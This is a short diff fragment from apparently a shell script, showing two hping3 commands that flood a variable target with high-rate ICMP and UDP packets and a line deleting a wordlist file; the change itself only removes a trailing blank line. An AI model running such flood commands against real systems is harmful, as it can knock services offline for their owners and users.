@@ -40,4 +40,3 @@ sudo hping3 --icmp -i u100 -d 1400 -c 50000 $TARGET
 sudo hping3 --udp -i u100 -p 53 -d 1000 -c 50000 $TARGET
 
 rm $WORDLIST
-
